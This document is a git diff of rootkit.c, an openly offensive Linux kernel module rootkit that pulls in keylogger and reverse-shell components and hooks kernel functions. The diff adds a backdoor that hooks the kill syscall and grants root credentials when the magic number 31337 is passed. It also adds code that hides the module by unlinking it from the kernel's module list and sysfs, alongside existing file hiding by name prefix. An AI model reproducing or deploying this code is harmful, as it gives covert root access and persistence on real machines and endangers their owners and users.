@@ -1,20 +1,30 @@
 /**
  * @file    rootkit.c
- * @author  Aaron Lichtman, Arch Gupta
- * @brief   A rootkit. TODO: Expand description
+ * @author  Aaron Lichtman
+ * @brief   A rootkit. // TODO: Expand description
  */
-#include <linux/fs.h>
-#include <linux/init.h>
-#include <linux/jiffies.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/types.h>
+#include <linux/jiffies.h>
 #include <linux/timer.h>
+#include <linux/threads.h>
+#include <linux/syscalls.h>
+#include <linux/sched.h>
+#include <linux/pid.h>
+#include <linux/cred.h>
+#include <linux/unistd.h>
+#include <asm/unistd.h>
+#include <linux/signal.h>
+#include <net/inet_sock.h>
+#include <linux/net.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
 
 MODULE_AUTHOR("Aaron Lichtman");
-MODULE_AUTHOR("Arch Gupta");
 MODULE_DESCRIPTION("Linux rootkit.");
 MODULE_VERSION("0.1");
 MODULE_LICENSE("GPL");  // So the kernel doesn't complain about proprietary code
@@ -33,21 +43,13 @@ typedef struct legacy_timer_emu {
 typedef struct timer_list _timer;
 #endif
 
-typedef struct commands {
-    // TODO: Add properties for each of the commands we can accept
-    char *rev_shell_ip;
-    // TODO: Add toggle for enabling and disabling hidden files.
-    bool escalate_privs;
-    bool keylogger;
-} commands;
-
 /**
  * Global defines and variables.
  */
 
 #define POLLING_INTERVAL 1500
+#define MAGIC_ROOT_NUM 31337
 static _timer polling_timer;
-struct commands cmds;
 
 /**
  * Module parameters are made writable by anyone.
@@ -63,12 +65,10 @@ MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
 static char *rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
+// TODO: Convert to array of strings.
 static char *hidden_file_prefix = NULL;
 module_param(hidden_file_prefix, charp, 0770);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
-static bool escalate_privileges = false;
-module_param(escalate_privileges, bool, 0770);
-MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");
 static bool keylogger = false;
 module_param(keylogger, bool, 0770);
 MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
@@ -77,6 +77,7 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  * Forward declarations
  */
 
+static int get_root(void);
 static void poll_for_commands(unsigned long data);
 
 /**
@@ -91,6 +92,25 @@ void log_info(const char *message) {
 void log_error(const char *message) {
     printk(KERN_ERR "GARDEN: %s", message);
 }
+
+/**
+ * Handle communication from userspace command program.
+ */
+
+// KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
+// static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg) {
+// 	if (cmd == ROOTKIT_CMD && arg == PREP_FOR_NEXT_CMD) {
+// 		// TODO: Set flag so that next time this method is called, things can happen.
+// 		// TODO: Exit.
+// 	}
+//
+// 	// TODO: If flag is set and cmd == ROOTKIT_CMD, read action_task from
+// 	// address that arg contains with copy_from_user.
+//
+// 	// TODO: Then add a large if-else or switch statement to handle all the commands.
+// 	return KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);;
+// }
+
 
 /**
  * Hide files and directories.
@@ -157,6 +177,25 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 }
 
 /**
+ * Drops the current user into a root shell.
+ */
+static int get_root(void) {
+	printk(KERN_EMERG "One root coming right up.");
+	return commit_creds(prepare_kernel_cred(NULL));
+}
+
+
+KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
+static long khook___x64_sys_kill(const struct pt_regs *regs) {
+        printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
+		if (regs->di == MAGIC_ROOT_NUM) {
+			return get_root();
+		}
+        return KHOOK_ORIGIN(__x64_sys_kill, regs);
+}
+
+
+/**
  * Timer and Command Polling Functions
  * Adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
  */
@@ -198,35 +237,21 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
 }
 
 /**
- * Check all parameters against last-known values and see if anything changed.
- * If yes, take the requested action.
- * Finally, start a timer to call this function again in the future.
+ * Do something on an interval, and then  start a timer to call this
+ * function again in the future.
  * NOTE: The data parameter is required in order for this to compile.
  */
 static void poll_for_commands(unsigned long data) {
     // TODO: Store previous values of variables somewhere.
     log_info("Polling for commands!\n");
-	printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
-	printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
-	printk(KERN_EMERG "block_removal: %d", block_removal);
-	printk(KERN_EMERG "keylogger enabled: %d", keylogger);
-
-    if (rev_shell_ip != cmds.rev_shell_ip) {
-        printk(KERN_EMERG "rev_shell_ip updated: %s\n", rev_shell_ip);
-        cmds.rev_shell_ip = rev_shell_ip;
-        // TODO: Set up reverse shell.
-    }
+	// printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
+	// printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
+	// printk(KERN_EMERG "block_removal: %d", block_removal);
+	// printk(KERN_EMERG "keylogger enabled: %d", keylogger);
 
     // TODO: Check for change in hidden file hiding
     // TODO: Check for keylogger enabling
-    // TODO: Check for escalating to root privs.
     set_timer(&polling_timer);
-}
-
-static void copy_params_into_cmd_struct(commands *cmd) {
-    cmd->rev_shell_ip = rev_shell_ip;
-    cmd->escalate_privs = escalate_privileges;
-    cmd->keylogger = keylogger;
 }
 
 /**
@@ -236,12 +261,15 @@ static int __init rootkit_init(void) {
     printk(KERN_EMERG "Initializing rootkit...\n");
     khook_init();
 
-    printk(KERN_EMERG "Reading parameters...\n");
-    copy_params_into_cmd_struct(&cmds);
-
     printk(KERN_EMERG "Initializing timer...\n");
     timer_init_wrapper(&polling_timer, poll_for_commands);
     set_timer(&polling_timer);
+
+	if (block_removal) {
+		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
+		list_del_init(&__this_module.list);
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+	}
 
     // Gotta make the compiler happy.
     poll_for_commands(0);
@@ -249,20 +277,12 @@ static int __init rootkit_init(void) {
 }
 
 /**
- * Called when $ rmmod is executed. If block_removal is toggled on, this
- * function stops the rootkit from being removed. If it is not enabled,
- * the rootkit is cleaned up nicely.
+ * Called when $ rmmod is executed. Cleans up rootkit nicely.
  */
 static void __exit rootkit_exit(void) {
 	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
-	if (block_removal) {
-		printk(KERN_EMERG "Just kidding. This sounds like a good time to reinstall your OS.");
-		rootkit_init();
-	} else {
-		khook_cleanup();
-		timer_cleanup_wrapper(&polling_timer);
-	}
-
+	khook_cleanup();
+	timer_cleanup_wrapper(&polling_timer);
 }
 
 module_init(rootkit_init);
